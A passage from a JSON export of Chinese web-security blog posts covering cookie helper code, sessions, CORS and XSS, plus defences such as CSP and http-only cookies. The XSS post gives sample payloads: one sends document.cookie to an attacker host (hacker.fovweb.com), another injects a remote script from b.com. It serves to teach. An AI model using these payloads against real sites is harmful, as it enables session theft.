class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 响应头中设置 Cookie</span><br><span class=\"line\">Set-Cookie: name1&#x3D;value1 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure]</span><br><span class=\"line\">Set-Cookie: name2&#x3D;value2 [ ;expires&#x3D;date][ ;domain&#x3D;domain][ ;path&#x3D;path][ ;secure]</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; 请求头中的 Cookie</span><br><span class=\"line\">Cookie: name1&#x3D;value1; name2&#x3D;value2;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// js 操作 Cookie</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 根据cookie名称获取cookie值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>name cookie名称</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return <span class=\"type\">&#123;[type]&#125;</span>      </span>[description]</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getCookie</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> arr = <span class=\"built_in\">document</span>.cookie.match(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">&quot;(^|\\\\W)&quot;</span> + name + <span class=\"string\">&quot;=([^;]*)(;|$)&quot;</span>));</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (arr !== <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"built_in\">decodeURIComponent</span>(arr[<span class=\"number\">2</span>]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Object&#125;</span> </span>options 参数配置</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.name cookie的名称</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.value cookie的值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.domain cookie访问权限域名，默认为当前域名</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;String&#125;</span> </span>options.path 默认为 /</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Date&#125;</span> </span>options.expires 如果不设置或不是 Date 类型，则默认为会话 cookie</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return <span class=\"type\">&#123;scope&#125;</span>      <span class=\"variable\">this</span></span></span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setCookie</span>(<span class=\"params\">options</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> name = options.name;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> value = options.value;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> path = options.path || <span class=\"string\">&quot;/&quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> domain = options.domain;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> expires = options.expires;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> str = name + <span class=\"string\">&quot;=&quot;</span> + <span class=\"built_in\">escape</span>(value) + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  str += <span class=\"string\">&quot;path=&quot;</span> + path + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (domain) &#123;</span><br><span class=\"line\">      str += <span class=\"string\">&quot;domain=&quot;</span> + domain + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (expires <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Date</span>) &#123;</span><br><span class=\"line\">      str += <span class=\"string\">&quot;expires=&quot;</span> + expires.toGMTString() + <span class=\"string\">&quot;; &quot;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.cookie = str;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* 删除 cookie</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>name cookie 名称</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>domain cookie 域</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@param  <span class=\"type\">&#123;String&#125;</span> </span>path cookie 路径</span></span><br><span class=\"line\"><span class=\"comment\">* <span class=\"doctag\">@return <span class=\"type\">&#123;scope&#125;</span>      <span class=\"variable\">this</span></span></span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deleteCookie</span>(<span class=\"params\">name, domain, path</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">this</span>.set(&#123;</span><br><span class=\"line\">      name: name,</span><br><span class=\"line\">      value: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">      domain: domain,</span><br><span class=\"line\">      path: path,</span><br><span class=\"line\">      expires: <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>()</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Session\"><a href=\"#Session\" class=\"headerlink\" title=\"Session\"></a>Session</h3><p>Session 是一种服务器端机制，具有保持连接的含义。当浏览器第一次访问时，服务器创建 Session，然后将 Session的 Id 以 Cookie 的形式发送回给浏览器，后续的访问会带上 Cookie，可用于识别用户，起到面向连接的作用。</p>\n<p>Session 对象在一段时间（如20min）没被使用，就会被销毁，或手动销毁 Session</p>\n<p><strong>注意事项</strong></p>\n<ul>\n<li>用户访问某个网站，登录成功后，服务器后生成一个 Session 对象，并设置失效时间，用于跟踪用户的操作和状态，并将Session产生的唯一标识符保存在Cookie中（即通过 Set-Cookie 响应头返回给浏览器，假设为 SessionId ），在一段时间内，用户访问其他页面时，会将Cookie（包含SessionId）传回给服务器，以此模拟”登陆态”功能。</li>\n<li>当用户关闭浏览器时，浏览器并不会发送任何信息到服务器，因此服务器端的 Session 依然有效，直到 Session 超过设置的时间，若这段时间内获取 SessionId 的值并传给服务器（如CSFR、XSS），依然可以保持为登陆状态，并获取该用户的所有权限。</li>\n</ul>\n<blockquote>\n<p>session 在服务器端用类似于 Map 结构的形式存储，当标签页或浏览器关闭时并不会通知到后端清除 session<br>sessionStorage 用于存储前端数据，当标签页或浏览器关闭时 sessionStorage 中的数据会被清除</p>\n</blockquote>\n"},{"title":"跨域资源共享（CORS）","date":"2021-01-14T07:43:00.000Z","_content":"\n# 跨域资源共享（CORS）\n\n跨域资源共享（Cross-Origin Resource Sharing）\n\nA 网站可以请求 B 网站的图片、字体、CSS文件、javascript文件等，该请求是一个跨域请求，但出于安全考虑，浏览器会限制 javascript 发起的跨域请求，即 XMLHttpRequest 和 Fetch 必须遵循同源策略。\n\t  \n**跨域请求分为简单请求和复杂请求**\n\t  \n1. 对于简单请求，可将请求直接发送到另一个域的服务器\n2. 对于复杂请求，会首先发送一个预检请求到另一个域的服务器（使用 Options 方法），以此来获知服务器是否允许该实际请求\n\t* 如果预检请求返回结果中，服务器允许了实际请求，即响应头中包含了 `Access-Control-Allow-Origin`、`Access-Control-Allow-Headers` 等信息，则再发送一个实际请求\n\t* 如果预检请求失败，服务器不允许实际请求，如响应报文未包含了正确CORS响应头，那么实际请求会被浏览器拦截，并可在控制台中看到报错信息\n\n> 所以跨域请求失败的原因，其实是从预检请求中得知另一个域的服务器不支持跨域，而导致真实的请求被浏览器拦截，因此浏览器肯定会发起至少一次跨站请求（**简单请求**、**预检请求**或者**预检请求 + 复杂请求**）\n\n*   javascript 要实现 CORS 需要浏览器和服务器同时支持，（现代浏览器 IE10+）\n*   对于现代浏览器，在发起跨域 ajax 请求时 ，会添加 Origin 字段，表明请求来自哪个源\n*   对于服务器端，须在响应头中添加 Access-Control-Allow-Origin 字段，表示接受某一域名的请求\n\n<br/>\n\n*   相比 JSONP ，CORS 更加安全，可靠；\n*   JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求；\n*   CORS 比 JSONP 有更好的错误处理，并能携带更多的数据；\n\n```\nGET /resources/public-data/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\nReferer: http://foo.example/examples/access-control/simpleXSInvocation.html\nOrigin: http://foo.example`\n`HTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 00:23:53 GMT\nServer: Apache/2.0.61 \nAccess-Control-Allow-Origin: *\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: application/xml\n```\n\n> 某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”：\n\n1. 使用下列方法之一： GET HEAD POST\n2. Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为：Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width\n3. Content-Type 的值仅限于下列三者之一：text/plain multipart/form-data application/x-www-form-urlencoded\n4. 请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。\n5. 请求中没有使用 ReadableStream 对象。","source":"_posts/Web 安全/跨域资源共享(CORS).md","raw":"---\ntitle: 跨域资源共享（CORS）\ncategories: Web 安全\ntags: [web 安全]\ndate: 2021-01-14 15:43:00\n---\n\n# 跨域资源共享（CORS）\n\n跨域资源共享（Cross-Origin Resource Sharing）\n\nA 网站可以请求 B 网站的图片、字体、CSS文件、javascript文件等，该请求是一个跨域请求，但出于安全考虑，浏览器会限制 javascript 发起的跨域请求，即 XMLHttpRequest 和 Fetch 必须遵循同源策略。\n\t  \n**跨域请求分为简单请求和复杂请求**\n\t  \n1. 对于简单请求，可将请求直接发送到另一个域的服务器\n2. 对于复杂请求，会首先发送一个预检请求到另一个域的服务器（使用 Options 方法），以此来获知服务器是否允许该实际请求\n\t* 如果预检请求返回结果中，服务器允许了实际请求，即响应头中包含了 `Access-Control-Allow-Origin`、`Access-Control-Allow-Headers` 等信息，则再发送一个实际请求\n\t* 如果预检请求失败，服务器不允许实际请求，如响应报文未包含了正确CORS响应头，那么实际请求会被浏览器拦截，并可在控制台中看到报错信息\n\n> 所以跨域请求失败的原因，其实是从预检请求中得知另一个域的服务器不支持跨域，而导致真实的请求被浏览器拦截，因此浏览器肯定会发起至少一次跨站请求（**简单请求**、**预检请求**或者**预检请求 + 复杂请求**）\n\n*   javascript 要实现 CORS 需要浏览器和服务器同时支持，（现代浏览器 IE10+）\n*   对于现代浏览器，在发起跨域 ajax 请求时 ，会添加 Origin 字段，表明请求来自哪个源\n*   对于服务器端，须在响应头中添加 Access-Control-Allow-Origin 字段，表示接受某一域名的请求\n\n<br/>\n\n*   相比 JSONP ，CORS 更加安全，可靠；\n*   JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求；\n*   CORS 比 JSONP 有更好的错误处理，并能携带更多的数据；\n\n```\nGET /resources/public-data/ HTTP/1.1\nHost: bar.other\nUser-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nConnection: keep-alive\nReferer: http://foo.example/examples/access-control/simpleXSInvocation.html\nOrigin: http://foo.example`\n`HTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 00:23:53 GMT\nServer: Apache/2.0.61 \nAccess-Control-Allow-Origin: *\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: application/xml\n```\n\n> 某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”：\n\n1. 使用下列方法之一： GET HEAD POST\n2. Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为：Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width\n3. Content-Type 的值仅限于下列三者之一：text/plain multipart/form-data application/x-www-form-urlencoded\n4. 请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。\n5. 请求中没有使用 ReadableStream 对象。","slug":"Web 安全/跨域资源共享(CORS)","published":1,"updated":"2021-04-30T07:33:43.677Z","_id":"cko4026bj000nox6r8i2ob0nk","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"跨域资源共享（CORS）\"><a href=\"#跨域资源共享（CORS）\" class=\"headerlink\" title=\"跨域资源共享（CORS）\"></a>跨域资源共享（CORS）</h1><p>跨域资源共享（Cross-Origin Resource Sharing）</p>\n<p>A 网站可以请求 B 网站的图片、字体、CSS文件、javascript文件等，该请求是一个跨域请求，但出于安全考虑，浏览器会限制 javascript 发起的跨域请求，即 XMLHttpRequest 和 Fetch 必须遵循同源策略。</p>\n<p><strong>跨域请求分为简单请求和复杂请求</strong></p>\n<ol>\n<li>对于简单请求，可将请求直接发送到另一个域的服务器</li>\n<li>对于复杂请求，会首先发送一个预检请求到另一个域的服务器（使用 Options 方法），以此来获知服务器是否允许该实际请求<ul>\n<li>如果预检请求返回结果中，服务器允许了实际请求，即响应头中包含了 <code>Access-Control-Allow-Origin</code>、<code>Access-Control-Allow-Headers</code> 等信息，则再发送一个实际请求</li>\n<li>如果预检请求失败，服务器不允许实际请求，如响应报文未包含了正确CORS响应头，那么实际请求会被浏览器拦截，并可在控制台中看到报错信息</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<p>所以跨域请求失败的原因，其实是从预检请求中得知另一个域的服务器不支持跨域，而导致真实的请求被浏览器拦截，因此浏览器肯定会发起至少一次跨站请求（<strong>简单请求</strong>、<strong>预检请求</strong>或者<strong>预检请求 + 复杂请求</strong>）</p>\n</blockquote>\n<ul>\n<li>  javascript 要实现 CORS 需要浏览器和服务器同时支持，（现代浏览器 IE10+）</li>\n<li>  对于现代浏览器，在发起跨域 ajax 请求时 ，会添加 Origin 字段，表明请求来自哪个源</li>\n<li>  对于服务器端，须在响应头中添加 Access-Control-Allow-Origin 字段，表示接受某一域名的请求</li>\n</ul>\n<br/>\n\n<ul>\n<li>  相比 JSONP ，CORS 更加安全，可靠；</li>\n<li>  JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求；</li>\n<li>  CORS 比 JSONP 有更好的错误处理，并能携带更多的数据；</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1</span><br><span class=\"line\">Host: bar.other</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class=\"line\">Accept-Encoding: gzip,deflate</span><br><span class=\"line\">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.html</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;foo.example&#96;</span><br><span class=\"line\">&#96;HTTP&#x2F;1.1 200 OK</span><br><span class=\"line\">Date: Mon, 01 Dec 2008 00:23:53 GMT</span><br><span class=\"line\">Server: Apache&#x2F;2.0.61 </span><br><span class=\"line\">Access-Control-Allow-Origin: *</span><br><span class=\"line\">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Type: application&#x2F;xml</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”：</p>\n</blockquote>\n<ol>\n<li>使用下列方法之一： GET HEAD POST</li>\n<li>Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为：Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width</li>\n<li>Content-Type 的值仅限于下列三者之一：text/plain multipart/form-data application/x-www-form-urlencoded</li>\n<li>请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。</li>\n<li>请求中没有使用 ReadableStream 对象。</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"跨域资源共享（CORS）\"><a href=\"#跨域资源共享（CORS）\" class=\"headerlink\" title=\"跨域资源共享（CORS）\"></a>跨域资源共享（CORS）</h1><p>跨域资源共享（Cross-Origin Resource Sharing）</p>\n<p>A 网站可以请求 B 网站的图片、字体、CSS文件、javascript文件等，该请求是一个跨域请求，但出于安全考虑，浏览器会限制 javascript 发起的跨域请求，即 XMLHttpRequest 和 Fetch 必须遵循同源策略。</p>\n<p><strong>跨域请求分为简单请求和复杂请求</strong></p>\n<ol>\n<li>对于简单请求，可将请求直接发送到另一个域的服务器</li>\n<li>对于复杂请求，会首先发送一个预检请求到另一个域的服务器（使用 Options 方法），以此来获知服务器是否允许该实际请求<ul>\n<li>如果预检请求返回结果中，服务器允许了实际请求，即响应头中包含了 <code>Access-Control-Allow-Origin</code>、<code>Access-Control-Allow-Headers</code> 等信息，则再发送一个实际请求</li>\n<li>如果预检请求失败，服务器不允许实际请求，如响应报文未包含了正确CORS响应头，那么实际请求会被浏览器拦截，并可在控制台中看到报错信息</li>\n</ul>\n</li>\n</ol>\n<blockquote>\n<p>所以跨域请求失败的原因，其实是从预检请求中得知另一个域的服务器不支持跨域，而导致真实的请求被浏览器拦截，因此浏览器肯定会发起至少一次跨站请求（<strong>简单请求</strong>、<strong>预检请求</strong>或者<strong>预检请求 + 复杂请求</strong>）</p>\n</blockquote>\n<ul>\n<li>  javascript 要实现 CORS 需要浏览器和服务器同时支持，（现代浏览器 IE10+）</li>\n<li>  对于现代浏览器，在发起跨域 ajax 请求时 ，会添加 Origin 字段，表明请求来自哪个源</li>\n<li>  对于服务器端，须在响应头中添加 Access-Control-Allow-Origin 字段，表示接受某一域名的请求</li>\n</ul>\n<br/>\n\n<ul>\n<li>  相比 JSONP ，CORS 更加安全，可靠；</li>\n<li>  JSONP 只能实现 GET 请求，而 CORS 支持所有类型的 HTTP 请求；</li>\n<li>  CORS 比 JSONP 有更好的错误处理，并能携带更多的数据；</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;resources&#x2F;public-data&#x2F; HTTP&#x2F;1.1</span><br><span class=\"line\">Host: bar.other</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class=\"line\">Accept-Encoding: gzip,deflate</span><br><span class=\"line\">Accept-Charset: ISO-8859-1,utf-8;q&#x3D;0.7,*;q&#x3D;0.7</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;access-control&#x2F;simpleXSInvocation.html</span><br><span class=\"line\">Origin: http:&#x2F;&#x2F;foo.example&#96;</span><br><span class=\"line\">&#96;HTTP&#x2F;1.1 200 OK</span><br><span class=\"line\">Date: Mon, 01 Dec 2008 00:23:53 GMT</span><br><span class=\"line\">Server: Apache&#x2F;2.0.61 </span><br><span class=\"line\">Access-Control-Allow-Origin: *</span><br><span class=\"line\">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Transfer-Encoding: chunked</span><br><span class=\"line\">Content-Type: application&#x2F;xml</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>某些请求不会触发 CORS 预检请求。本文称这样的请求为“简单请求”，请注意，该术语并不属于 Fetch （其中定义了 CORS）规范。若请求满足所有下述条件，则该请求可视为“简单请求”：</p>\n</blockquote>\n<ol>\n<li>使用下列方法之一： GET HEAD POST</li>\n<li>Fetch 规范定义了对 CORS 安全的首部字段集合，不得人为设置该集合之外的其他首部字段。该集合为：Accept Accept-Language Content-Language Content-Type DPR Downlink Save-Data Viewport-Width Width</li>\n<li>Content-Type 的值仅限于下列三者之一：text/plain multipart/form-data application/x-www-form-urlencoded</li>\n<li>请求中的任意XMLHttpRequestUpload 对象均没有注册任何事件监听器；XMLHttpRequestUpload 对象可以使用 XMLHttpRequest.upload 属性访问。</li>\n<li>请求中没有使用 ReadableStream 对象。</li>\n</ol>\n"},{"title":"跨站脚本攻击 (XSS)","date":"2021-01-14T07:42:00.000Z","_content":"\n# 跨站脚本攻击 (XSS)\n\n跨站脚本攻击 XSS (Cross Site Scripts)\n\n说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行\n\n\n### 1. 反射型XSS步骤\n\n1. 用户正常登录Web应用程序，登录成功会得到一个会话信息的 `cookie`\n2. 攻击者将含有攻击代码的URL发送给被攻击人，例：`http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E`\n3. 用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中；\n4. 请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者；\n\n**note:**\n* 链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等\n* 链接必须被用户点击才会触发\n* 危害范围小，受害者人数较少\n* 例子：`http://health.sohu.com/so/index.shtml?t=news&wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22`\n\n\n### 2. 持久型 XSS 步骤\n\n1. 攻击者向存在漏洞的网站注入恶意代码，如`http://a.com/a.jsp?name=xss<script src=http://b.com/b.js></script>`\n2. 用户访问该网站会下载 js 文件，并执行里面的代码\n3. js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者\n  \n**note：**\n* 攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等\n* 访问存在漏洞的网站就会触发\n* 危害范围大，受害者人数较多\n\n\n### 3. 防御措施\n* 设置 Content-Security-Policy 头信息（HTTP 头信息、html 的 meta 标签），控制浏览器能够为指定的页面加载哪些资源\n* 在服务器端设置 Cookie 为 `http-only`，浏览器会禁止 js 访问该 `Cookie`\n* 输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端）\n* 输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端）\n* 针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致\n* 利用模板引擎，避免内联事件，避免拼接 HTML\n\n##### 参考\n* [Content-Security-Policy文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy)\n","source":"_posts/Web 安全/跨站脚本攻击(XSS).md","raw":"---\ntitle: 跨站脚本攻击 (XSS)\ncategories: Web 安全\ntags: [web 安全]\ndate: 2021-01-14 15:42:00\n---\n\n# 跨站脚本攻击 (XSS)\n\n跨站脚本攻击 XSS (Cross Site Scripts)\n\n说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行\n\n\n### 1. 反射型XSS步骤\n\n1. 用户正常登录Web应用程序，登录成功会得到一个会话信息的 `cookie`\n2. 攻击者将含有攻击代码的URL发送给被攻击人，例：`http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 